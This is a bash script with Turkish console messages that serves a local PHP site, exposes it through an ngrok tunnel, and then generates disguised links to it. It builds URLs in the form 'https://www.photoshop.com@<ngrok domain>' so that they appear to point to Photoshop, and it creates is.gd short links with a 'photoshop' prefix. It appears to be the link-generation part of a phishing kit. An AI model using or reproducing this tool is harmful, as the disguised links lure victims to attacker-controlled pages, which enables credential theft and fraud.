#!/bin/bash
if [[ $1 == -bg ]];then
	if [[ $2 == -p ]];then
		php -S 127.0.0.1:$3 & ngrok http $3 > /dev/null &
		sleep 1
		echo
		echo
		echo
		printf "\e[33m[*]\e[97m LİNK OLUŞTURULUYOR.."
		echo
		echo
		while :
		do
			kontrol=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o \"https://[a-z.0-9.A-Z.]\*.ngrok.io\" |tr -d '"' |wc -l)
			if [[ $kontrol == 1 ]];then
				break
			fi
		done
		echo
		echo
		echo
		url=$(curl -s http://127.0.0.1:4040/api/tunnels |grep -o \"https://[a-z.0-9.A-Z.]\*.ngrok.io\" |tr -d '"')
		domain=$(echo -e "$url" |grep -o /[a-z.0-9.A-Z.]\*.ngrok.io |tr -d '/')
		printf "LİNK 1 \e[31m>>\e[97m $url"
		echo
		echo
		echo
		printf "LİNK 2 \e[31m>>\e[97m https://www.photoshop.com@$domain"
		ozellink=$(curl -s -X POST "https://is.gd/create.php" -d url="$url" -d shorturl="photoshop$(date +%d%m%G%H%S)")
		link3=$(echo -e "$ozellink" |grep -o is.gd/[A-Z.a-z.0-9]\* |sed -n 1p)
		echo
		echo
		echo
		printf "LİNK 3 \e[31m>>\e[97m https://www.photoshop.com@$link3 "
		echo
		echo
		echo
		printf "LİNK 4 \e[31m>>\e[97m $(echo -e "$ozellink" |grep -o https://is.gd/[A-Z.a-z.0-9]\* |sed -n 1p)"
		echo
		echo
		echo
		exit
	fi
else
	php -S 127.0.0.1:$1 & ngrok http $1
fi
